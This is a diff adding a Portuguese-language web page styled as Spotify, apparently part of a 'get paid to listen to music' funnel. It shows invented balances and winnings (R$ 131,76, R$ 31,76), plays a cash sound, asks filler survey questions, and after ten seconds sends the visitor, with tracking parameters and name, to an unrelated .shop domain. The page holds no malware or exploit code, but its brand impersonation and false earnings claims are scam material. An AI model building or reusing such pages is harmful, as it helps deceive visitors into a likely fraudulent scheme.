@@ -1,0 +1,414 @@
+<!DOCTYPE html><html lang="en"><head>
+
+<script>
+    function saveUTMs() {
+        const params = new URLSearchParams(window.location.search);
+        const utmParams = ['utm_source', 'utm_medium', 'utm_campaign', 'utm_content', 'utm_term'];
+
+        utmParams.forEach(param => {
+            const value = params.get(param);
+            if (value) {
+                localStorage.setItem(param, value);
+            } else if (!localStorage.getItem(param)) {
+                localStorage.setItem(param, 'null');
+            }
+        });
+
+        const nome = params.get('nome');
+        if (nome) {
+            localStorage.setItem('nome', nome);
+        }
+    }
+
+    function buildQueryString() {
+        const utmParams = ['utm_source', 'utm_medium', 'utm_campaign', 'utm_content', 'utm_term'];
+        const queryParams = [];
+
+        const nome = localStorage.getItem('nome');
+        if (nome) {
+            queryParams.push(`nome=${encodeURIComponent(nome)}`);
+        }
+
+        utmParams.forEach(param => {
+            const value = localStorage.getItem(param);
+            if (value) {
+                queryParams.push(`${param}=${encodeURIComponent(value)}`);
+            }
+        });
+
+        return queryParams.join('&');
+    }
+
+    function redirecionar(proximaPagina) {
+        const query = buildQueryString();
+        window.location.href = `${proximaPagina}?${query}`;
+    }
+
+    saveUTMs();
+</script>
+
+
+<script>
+    function saveUTMs() {
+        const params = new URLSearchParams(window.location.search);
+        const utmParams = ['utm_source', 'utm_medium', 'utm_campaign', 'utm_content', 'utm_term'];
+
+        utmParams.forEach(param => {
+            const value = params.get(param);
+            if (value) {
+                localStorage.setItem(param, value);
+            } else if (!localStorage.getItem(param)) {
+                localStorage.setItem(param, 'null');
+            }
+        });
+
+        const nome = params.get('nome');
+        if (nome) {
+            localStorage.setItem('nome', nome);
+        }
+    }
+
+    function buildQueryString() {
+        const utmParams = ['utm_source', 'utm_medium', 'utm_campaign', 'utm_content', 'utm_term'];
+        const queryParams = [];
+
+        const nome = localStorage.getItem('nome');
+        if (nome) {
+            queryParams.push(`nome=${encodeURIComponent(nome)}`);
+        }
+
+        utmParams.forEach(param => {
+            const value = localStorage.getItem(param);
+            if (value) {
+                queryParams.push(`${param}=${encodeURIComponent(value)}`);
+            }
+        });
+
+        return queryParams.join('&');
+    }
+
+    function redirecionar(proximaPagina) {
+        const query = buildQueryString();
+        window.location.href = `${proximaPagina}?${query}`;
+    }
+
+    saveUTMs();
+</script>
+
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Spotify</title>
+
+    <!-- FONT GOOGLE POPPINS -->
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin="">
+    <link href="https://fonts.googleapis.com/css2?family=Poppins:ital,wght@0,100;0,200;0,300;0,400;0,500;0,600;0,700;0,800;0,900;1,100;1,200;1,300;1,400;1,500;1,600;1,700;1,800;1,900&display=swap" rel="stylesheet">
+
+    <style>
+        body, html {
+            height: 100%;
+            margin: 0;
+            padding: 0;
+            justify-content: space-around;
+            display: flex;
+            flex-direction: column;
+            background-color: rgb(24, 24, 24);
+            align-items: center;    /* Centraliza verticalmente */
+          }
+          .centralizado {
+            margin-top: 70px;
+            width: 300px;
+            background-color: rgb(0, 0, 0);
+            text-align: center;
+            padding: 20px;
+            display: flex;
+            flex-direction: column;
+            justify-content: space-between;
+            align-items: center;
+            border-radius: 10px;
+          }
+          *{
+            font-family: "Poppins", sans-serif;
+            color: white;
+            padding: 0px;
+          }
+          #logocentral{
+            width: 90px;
+          }
+          #textoprincipalsptfy{
+            font-size: 23px;
+            font-weight: 700;
+          }
+          #descricaoiniciospotify{
+            color: rgb(168, 168, 168);
+            margin-top: -10px;
+            font-size: 14px;
+          }
+          #descricaoiniciospotifyy{
+            color: rgb(168, 168, 168);
+            font-size: 14px;
+            font-weight: 500;
+          }
+          #divisorlinha{
+            width: 95%;
+            height: 1px;
+            background-color: rgb(105, 105, 105);
+          }
+          #txtinputmeil{
+            color: rgb(168, 168, 168);
+          }
+          #logincadastro{
+            display: flex;
+            font-size: 15px;
+            width: 100%;
+            flex-direction: column;
+            text-align: left;
+          }
+          #inputcadastro, #nomeInput{
+            padding: 13px 10px;
+            color: rgb(168, 168, 168);
+            border-radius: 5px;
+            margin-top: 5px;
+            border: 1px solid rgb(168, 168, 168);
+            background-color: rgb(24, 24, 24);
+          }
+          #meuBotao{
+            padding: 13px 10px;
+            background-color: gray;
+            color: white;
+            margin-top: 10px;
+            border-radius: 50px;
+            border: 1px solid gray;
+            text-decoration: none;
+            width: 90%;
+            font-weight: 600;
+          }
+
+        /* Estilo após a mudança de cor */
+        .verde {
+            background-color: rgb(1, 214, 97);
+            cursor: pointer; /* Muda o cursor para indicar que agora é clicável */
+        }
+          #topoFixo {
+            position: fixed;
+            top: 0; /* Define a posição no topo da página */
+            left: 0; /* Alinha à esquerda */
+            width: 100%; /* Faz a div ocupar toda a largura da página */
+            background-color: #000000; /* Cor de fundo (verde) */
+            color: white; /* Cor do texto */
+            padding: 15px 10px;
+            align-items: center;
+            display: flex;
+            justify-content: space-between;
+            text-align: center; /* Centraliza o texto */
+        }
+        #logo{
+            width: 130px;
+        }
+        #saldoatual{
+            padding: 10px 15px;
+            border-radius: 10px;
+            margin-right: 20px;
+            background-color: rgb(7, 187, 52);
+        }
+        #txtnotificacao{
+            color: white;
+        }
+        #notificacao{
+            background-color: rgba(1, 214, 97, 0.434);
+            display: flex;
+            margin-top: -10px;
+            align-items: center;
+            margin-bottom: 10px;
+            text-align: center;
+            font-size: 14px;
+            justify-content: center;
+            width: 100%;
+            height: 35px;
+            border-radius: 10px;
+            border: 1px solid rgb(1, 214, 97);
+        }
+    </style>
+</head>
+<body>
+    <!-- TOPO FIXO -->
+    <div id="topoFixo">
+        <img src="images/logo.png" id="logo">
+        <div id="saldoatual">
+            Saldo: R$ 131,76
+        </div>
+    </div>
+
+    <div class="centralizado">
+        <!-- IMAGEM DA LOGO -->
+        <img src="images/logowhite.png" id="logocentral">
+
+        <!-- TEXTO POP UP -->
+         <p id="textoprincipalsptfy">
+            Olá, <b id="mensagem">Visitante!</b>
+         </p>
+
+         <!-- DESCRICAO -->
+          <p id="descricaoiniciospotify">
+            Escute a música abaixo e <b>ganhe por isso</b>
+          </p>
+
+          <div id="notificacao">
+            <p id="txtnotificacao">Você ganhou <b>R$ 31,76</b></p>
+        </div>
+
+           <!-- DADOS DE LOGIN -->
+           <iframe style="border-radius:10px" src="https://open.spotify.com/embed/track/1LvaJ2hAtmUqN5Xm6OZCTH?utm_source=generator&theme=0" width="100%" height="200" frameborder="0" allowfullscreen="" allow="autoplay; clipboard-write; encrypted-media; fullscreen; picture-in-picture" loading="lazy"></iframe>
+
+           <!-- SISTEMA DE AVALIACAO -->
+            <style>
+                #botaperguntas{
+                    display: flex;
+                    padding: 10px;
+                    margin-top: -20px;
+                    justify-content: space-between;
+                }
+                #opcao, #opcaoo, #opcaooo, #opcaoooo{
+                    padding: 10px 50px;
+                    border-radius: 10px;
+                    width: 90%;
+                    background-color: gray;
+                    color: white;
+                }
+                #avalaiacao{
+                    margin-top: -50px;
+                }
+            </style>
+            <div id="avalaiacao">
+                <div id="perguntacompleta">
+                    <p id="texytpergunta">Ja ouviu essa música no TikTok?</p>
+                    <div id="botaperguntas">
+                        <div id="opcao">Sim</div>
+                        <div id="opcaoo" style="margin-left: 10px;">Não</div>
+                    </div>
+                </div>
+                <audio id="slotSound" autoplay="">
+                    <source src="media/cash.mp3" type="audio/mpeg">
+                  </audio>
+
+                <div id="perguntacompleta">
+                    <p id="texytpergunta">Você conhece a letra dessa música?</p>
+                    <div id="botaperguntas">
+                        <div id="opcaooo">Sim</div>
+                        <div id="opcaoooo" style="margin-left: 10px;">Não</div>
+                    </div>
+                </div>
+
+                
+                <script>
+                    // Função para mudar a cor do botão ao clicar
+                    document.getElementById('opcao').onclick = function() {
+                        const botao = this; // Referência ao botão clicado
+                        botao.style.backgroundColor = 'rgb(1, 214, 97)'; // Altera a cor do fundo para verde
+                        botao.style.borderColor = 'rgb(1, 214, 97)'; // Altera a cor da borda para verde
+                    };
+
+                    // Função para mudar a cor do botão ao clicar
+                    document.getElementById('opcaoo').onclick = function() {
+                        const botao = this; // Referência ao botão clicado
+                        botao.style.backgroundColor = 'rgb(1, 214, 97)'; // Altera a cor do fundo para verde
+                        botao.style.borderColor = 'rgb(1, 214, 97)'; // Altera a cor da borda para verde
+                    };
+
+                    // Função para mudar a cor do botão ao clicar
+                    document.getElementById('opcaooo').onclick = function() {
+                        const botao = this; // Referência ao botão clicado
+                        botao.style.backgroundColor = 'rgb(1, 214, 97)'; // Altera a cor do fundo para verde
+                        botao.style.borderColor = 'rgb(1, 214, 97)'; // Altera a cor da borda para verde
+                    };
+
+                    // Função para mudar a cor do botão ao clicar
+                    document.getElementById('opcaoooo').onclick = function() {
+                        const botao = this; // Referência ao botão clicado
+                        botao.style.backgroundColor = 'rgb(1, 214, 97)'; // Altera a cor do fundo para verde
+                        botao.style.borderColor = 'rgb(1, 214, 97)'; // Altera a cor da borda para verde
+                    };
+                </script>
+            </div>
+
+            <button onclick="redirecionar()" id="meuBotao" disabled="">De play e faça um feedback</button>
+
+            <script>
+                // Função para mudar a cor do botão e da borda, além de habilitar o redirecionamento
+                function mudarBotao() {
+                    const botao = document.getElementById('meuBotao');
+                    botao.style.backgroundColor = 'rgb(1, 214, 97)';  // Altera a cor do fundo diretamente
+                    botao.style.borderColor = 'rgb(1, 214, 97)';  // Altera a cor da borda diretamente
+                    botao.style.cursor = 'pointer';  // Muda o cursor para indicar que agora é clicável
+                    botao.innerText = 'Ir para a próxima música';  // Altera o texto do botão
+                    botao.disabled = false;  // Habilita o botão para ser clicado
+
+                    // Adiciona o redirecionamento ao clicar no botão
+                    botao.onclick = function() { redirecionar("https://acessaragora.shop/preta/04/"); }
+</script>
+
+
+<script>
+    window.onload = function() {
+        const nome = localStorage.getItem('nome');
+        if (nome && nome !== 'null') {
+            document.getElementById('mensagem').innerText = `${nome}!`;
+        } else {
+            document.getElementById('mensagem').innerText = 'Visitante!';
+        }
+    }
+</script>
+
+<script>
+    function liberarBotao() {
+        const botao = document.getElementById('meuBotao');
+        botao.style.backgroundColor = 'rgb(1, 214, 97)';
+        botao.style.borderColor = 'rgb(1, 214, 97)';
+        botao.style.cursor = 'pointer';
+        botao.innerText = 'Ir para a próxima música';
+        botao.disabled = false;
+        botao.classList.add('verde');
+
+        botao.onclick = function() {
+            redirecionar('https://acessaragora.shop/preta/04/');
+        }
+    }
+    setTimeout(liberarBotao, 10000);
+</script>
+
+<script>
+    // Grupo 1
+    const grupo1 = [document.getElementById('opcao'), document.getElementById('opcaoo')];
+    grupo1.forEach(botao => {
+        botao.addEventListener('click', () => {
+            grupo1.forEach(b => {
+                b.style.backgroundColor = 'gray';
+                b.style.borderColor = 'gray';
+            });
+            botao.style.backgroundColor = 'rgb(1, 214, 97)';
+            botao.style.borderColor = 'rgb(1, 214, 97)';
+        });
+    });
+
+    // Grupo 2
+    const grupo2 = [document.getElementById('opcaooo'), document.getElementById('opcaoooo')];
+    grupo2.forEach(botao => {
+        botao.addEventListener('click', () => {
+            grupo2.forEach(b => {
+                b.style.backgroundColor = 'gray';
+                b.style.borderColor = 'gray';
+            });
+            botao.style.backgroundColor = 'rgb(1, 214, 97)';
+            botao.style.borderColor = 'rgb(1, 214, 97)';
+        });
+    });
+</script>
+<p id="descricaoiniciospotifyy">
+      Este site é protegido pelo reCAPTCHA e está sujeito à
+      <b style="color: rgb(1, 214, 97); font-weight: 500;">Política de Privacidade</b>
+      e aos
+      <b style="color: rgb(1, 214, 97); font-weight: 500;">Termos de Serviço do Google.</b>
+    </p>
+  </div>
+
+</div></body></html>
